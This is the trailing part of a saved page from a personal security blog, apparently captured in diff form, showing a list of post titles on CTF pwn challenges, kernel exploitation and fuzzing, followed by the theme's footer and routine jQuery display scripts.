+<ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2017/05/08/SSCTF-2017部分Writeup/">SSCTF-2017部分Writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/22/360春秋CTF-pwn/">360春秋CTF--pwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/04/06/Linux-Kernel-Exploit-4-beginners/">Linux Kernel Exploit 4 beginners</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/15/NJCTF-2017部分wp/">NJCTF-2017部分wp</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/06/SECCON-2016-jmper/">SECCON-2016 jmper</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/03/04/codegate2017-angrybird/">codegate2017-angrybird</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/27/LLVM-Study-Log/">LLVM Study Log</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/16/ichunqiu-CTF-2017-2/">ichunqiu-CTF-2017-2</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/08/Adding-your-own-syscall-in-linux-kernel/">Adding your own syscall in linux kernel</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/02/04/Windows-Kernel-Exploit-Study-3/">Windows-Kernel-Exploit-Study(3)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/30/Linux socket进程间通信及应用/">Linux socket进程间通信及应用</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/28/一点碎碎念/">一点碎碎念</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/22/Have-fun-with-Blind-ROP/">Have fun with Blind ROP</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/20/Windows-Kernel-Exploit-Study-2/">Windows Kernel Exploit Study(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2017/01/19/Windows-Kernel-Exploit-Study-1/">Windows Kernel Exploit Study(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/24/what-DynELF-does-basically/">what DynELF does basically</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/17/fuzzing-with-peach-Just-a-toy/">fuzzing with peach(Just a toy)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/25/PlaidCTF-2016-butterfly/">PlaidCTF 2016 butterfly</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/21/Have-fun-with-glibc内存管理/">Have fun with glibc内存管理</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/10/linux-下起shell失败的分析/">linux 下起shell失败的分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/11/07/Baiudu杯-pwn专场记录/">Baiudu杯 pwn专场记录</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/29/how-to-compile-WinAFL/">how to compile WinAFL</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/25/yocto-writeup/">yocto writeup</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/HITCON-2016-Quals-SecretHolder/">HITCON-2016-Quals-SecretHolder</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/11/CVE-2012-4792学习/">CVE-2012-4792学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/10/06/一点感悟/">一点感悟</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/27/BCTF-cloud/">BCTF--cloud</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/24/一些环境配置遇到的坑-持续更新/">一些环境配置遇到的坑(持续更新)</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/09/16/Malloc-Maleficarum-复盘/">Malloc-Maleficarum-复盘</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/26/初试winafl/">初试winafl</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/14/pwnable-kr-alloca/">pwnable.kr -- alloca</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/08/01/简单的尝试angr/">简单的尝试angr</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/第一个android-cm调试分析/">第一个android cm调试分析</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/06/29/install-gef/">install gef</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/04/30/cctf-pwn350/">cctf pwn350</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/02/15/heap-vuln-unlink/">heap vuln -- unlink</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/12/02/format-string-with-stack-frame/">format string with stack frame</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/16/RCTF-PWN200/">RCTF -- PWN200</a></li><li class="post-list-item"><a class="post-list-link" href="/2015/11/05/dragon/">dragon</a></li></ul>
+<script src="./heap vuln -- unlink  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script>
+        $(".post-list").addClass("toc-article");
+        $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+            }
+        })
+    </script>
+<script>
+</script>
+</div>
+<footer id="footer">
+<div class="outer">
+<div id="footer-info">
+<div class="footer-left">
+                © 2017 muhe
+            </div>
+<div class="footer-right">
+<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/luuman/hexo-theme-spfk" target="_blank">spfk</a> by luuman
+            </div>
+</div>
+<div class="visit">
+<span id="busuanzi_container_site_pv" style="display:none">
+<span id="site-visit">访客数量: 
+                            <span id="busuanzi_value_site_uv"></span>
+</span>
+</span>
+<span>, </span>
+<span id="busuanzi_container_page_pv" style="display:none">
+<span id="page-visit">本页阅读量: 
+                            <span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+</div>
+</div>
+</footer>
+</div>
+<script src="./heap vuln -- unlink  o0xmuhe's blog/require-2.1.6,jquery-1.9.1.min.js"></script>
+<script src="./heap vuln -- unlink  o0xmuhe's blog/main.js"></script>
+<script>
+        $(document).ready(function() {
+            var backgroundnum = 24;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+<div class="scroll" id="scroll">
+<a href="#"><i class="fa fa-arrow-up"></i></a>
+<a href="#comments"><i class="fa fa-comments-o"></i></a>
+<a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+<script async="" src="./heap vuln -- unlink  o0xmuhe's blog/busuanzi.pure.mini.js">
+</script>
+<script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+</div>
+</body>
+</html>
